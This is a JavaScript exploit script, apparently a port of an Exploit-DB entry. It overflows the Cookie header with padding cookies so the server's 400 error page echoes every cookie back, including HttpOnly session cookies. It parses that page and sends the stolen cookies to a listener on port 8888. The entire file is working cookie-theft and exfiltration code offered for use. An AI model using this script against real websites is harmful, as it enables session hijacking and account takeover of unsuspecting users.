// SOURCE https://www.exploit-db.com/exploits/18442
// Most browsers limit cookies to 4k characters, so we need multiple
function setCookies(good) {
    let cookie, i
    let str = ""

    for (i = 0; i < 819; i++) {
        str += "x"
    }
    // Set cookies
    for (i = 0; i < 10; i++) {
        // Expire evil cookie
        if (good) {
            cookie = "xss" + i + "=;expires=" + new Date(+new Date() - 1).toUTCString() + "; path=/;"
        }
        // Set evil cookie
        else {
            cookie = "xss" + i + "=" + str + ";path=/"
        }
        document.cookie = cookie
    }
}

function makeRequest() {
    setCookies()

    function parseCookies() {
        const cookie_dict = {}
        // Only react on 400 status
        if (xhr.readyState === 4 && xhr.status === 400) {
            // Replace newlines and match <pre> content
            let content = xhr.responseText.replace(/[\r\n]/g, "")
                             .match(/<pre>(.+)<\/pre>/)
            if (content.length) {
                // Remove Cookie: prefix
                content = content[1].replace("Cookie: ", "")
                const cookies = content.replace(/xss\d=x+;?/g, "")
                                       .split(/;/g)
                // Add cookies to object
                for (let i = 0; i < cookies.length; i++) {
                    const s_c = cookies[i].split("=", 2)
                    cookie_dict[s_c[0]] = s_c[1]
                }
            }
            // Unset malicious cookies
            setCookies(true)

            // Remember to start a web server that listens for the incoming connection at :8888!
            fetch(`http://localhost:8888?cookie=${JSON.stringify(cookie_dict)}`)
        }
    }

    // Make XHR request
    const xhr = new XMLHttpRequest()
    xhr.onreadystatechange = parseCookies
    xhr.open("GET", "/", true)
    xhr.send(null)
}

makeRequest()
